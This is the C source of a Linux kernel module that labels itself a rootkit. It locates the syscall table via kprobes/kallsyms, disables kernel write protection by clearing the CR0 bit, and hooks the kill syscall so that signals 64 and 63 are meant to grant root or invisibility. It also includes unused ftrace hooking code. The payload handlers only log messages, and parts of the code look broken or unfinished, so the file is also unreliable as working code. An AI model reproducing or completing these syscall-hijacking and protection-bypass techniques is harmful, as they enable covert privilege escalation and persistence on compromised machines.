/*
 Works for kernel versions >= (4,17,0)
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ftrace.h>

#include <linux/list.h>

// Syscall table address pointer
unsigned long *__sys_call_table_addr;
static struct nf_hook_ops nfho;

// Structure that represents ftrace hook
struct ftrace_hook {
    const char *name;
    void *original_function;
    void *modified_function;

    unsigned long address;
    struct ftrace_ops ops;
};

enum signals {
    SIGSUPER = 64, // Become root
    SIGINVIS = 63, // Become invisible
};

LIST_HEAD(hook_list);

// Using kprobes method for getting syscall table address for new versions of kernel
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
		.symbol_name = name
	};

    unsigned long ret_value;

    if (register_kprobe(&kp) < 0) return 0;

    ret_value = (unsigned long) kp.addr;
    unregister_kprobe(&kp);

    return ret_value;
}

#else

static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}

#endif

#ifdef KPROBE_

// Defining kprobe for syscall_table (should be replaced with function above)
typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);

static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif

// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
#ifdef CONFIG_X86

#include <asm/paravirt.h>
#define PTREGS_MODIF

// For new versions of kernel ptregs_t type serves as a syscall wrapepr
typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);
static syscall_wrapper orig_kill;

static inline void write_forced_cr0(unsigned long value)
{
    unsigned long __force_order;

    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    pr_info("Unprotected memory\n");
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
    pr_info("Protected memory\n");
}

#endif

// Modified syscalls
#ifdef PTREGS_MODIF

static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
{
    int sig = regs->si;

    if (sig == SIGSUPER) {
        printk("Signal 64 was intercepted | became root");
        return 0;
    } else if (sig == SIGINVIS) {
        printk("Signal 63 was intercepted | became invisible");
        return 0;
    }

    return orig_kill(regs);
}

#endif

// Working with syscalls

static void store_kill(void)
{
    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
}


static void hook_kill(void)
{
    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
}


static void restore_kill(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
}

static int save_original_ftraceh(struct ftrace_hook *hook)
{
    hook->address = lookup_name(hook->name);

    if (!hook->address) {
        pr_debug("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long*) hook->original_function) = hook->address;

    return 0;
}

static void notrace create_callback(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

static int register_ftrace_hook(struct ftrace_hook *hook)
{
    if (save_original_ftraceh(hook) != 0) return -1;

    hook->ops.func = create_callback;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                      | FTRACE_OPS_FL_RECURSION
                      | FTRACE_OPS_FL_IPMODIFY;

    int err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);

    if (err) {
        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_debug("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);

    if (err) pr_debug("unregister_ftrace_function() failed: %d\n", err);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

// Function that launches when module is inserted
static int __init mod_init(void)
{
    pr_info("rootkit: started\n");

#ifdef KPROBE_

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif

    __sys_call_table_addr = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    store_kill();
    unprotect_memory();

    hook_kill();
    protect_memory();

    return 0;
}


// Function that launches when module is released
static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");

    unprotect_memory();
    restore_kill();
    protect_memory();
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
